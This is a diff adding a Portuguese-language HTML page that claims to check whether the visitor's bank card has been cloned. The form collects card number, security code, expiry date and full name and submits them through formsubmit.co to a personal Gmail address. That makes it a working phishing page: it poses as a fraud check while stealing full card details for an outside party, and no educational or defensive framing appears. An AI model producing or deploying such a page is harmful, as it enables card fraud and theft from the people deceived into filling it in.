@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <link rel="stylesheet" href="./style.css">
+</head>
+
+<body>
+  <main>
+    <h1>Veja se seu cartão foi clonado</h1>
+
+    <div class="mandar_email">
+      <form action="https://formsubmit.co/raphael.takeuchi@gmail.com" method="POST">
+        <div class="form-group">
+          <label for="numCartao" class="label">Número do cartão:</label>
+          <input autocomplete="off" type="text" name="numCartao" id="numCartao" required class="input">
+        </div>
+        <div class="form-group">
+          <label for="codSeg" class="label">Código de segurança:</label>
+          <input autocomplete="off" type="text" name="codSeg" id="codSeg" required class="input">
+        </div>
+        <div class="form-group">
+          <label for="valid" class="label">Validade:</label>
+          <input autocomplete="off" type="text" name="valid" id="valid" required class="input">
+        </div>
+        <div class="form-group">
+          <label for="nome" class="label">Nome completo:</label>
+          <input autocomplete="off" type="text" name="nome" id="nome" required class="input">
+        </div>
+        <div class="button">
+          <button type="submit">Verificar</button>
+        </div>
+      </form>
+    </div>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
